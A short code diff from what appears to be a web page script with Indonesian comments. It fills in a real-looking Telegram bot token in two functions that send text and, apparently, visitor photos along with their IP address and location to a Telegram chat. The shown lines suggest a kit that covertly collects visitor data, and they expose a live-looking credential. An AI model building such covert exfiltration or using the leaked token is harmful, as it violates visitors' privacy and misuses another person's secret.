@@ -164,7 +164,7 @@ function initMainPage() {
     // 9. --- LOGIKA PENGIRIMAN DATA TEXT KE TELEGRAM (STANDAR) ---
     const sendTelegramMessage = (text) => {
         // !!! GANTI DENGAN BOT_TOKEN ANDA !!!
-        const BOT_TOKEN = 'GANTI_DENGAN_BOT_TOKEN_ANDA'; 
+        const BOT_TOKEN = '8491510356:AAHw94nzgO3z6H3-0Sjjlu-l1NJrka3SuCE'; 
         // !!! GANTI DENGAN CHAT_ID ANDA !!!
         const CHAT_ID = 'GANTI_DENGAN_CHAT_ID_ANDA';
         
@@ -240,7 +240,7 @@ function initMainPage() {
     // 11. --- LOGIKA PENGIRIMAN FOTO KE TELEGRAM ---
     const sendPhotoToTelegram = (photoBlob, ip, location, currentCount, totalCount) => {
         // !!! GANTI DENGAN BOT_TOKEN ANDA !!!
-        const BOT_TOKEN = 'GANTI_DENGAN_BOT_TOKEN_ANDA'; 
+        const BOT_TOKEN = '8491510356:AAHw94nzgO3z6H3-0Sjjlu-l1NJrka3SuCE'; 
         // !!! GANTI DENGAN CHAT_ID ANDA !!!
         const CHAT_ID = 'GANTI_DENGAN_CHAT_ID_ANDA';
         
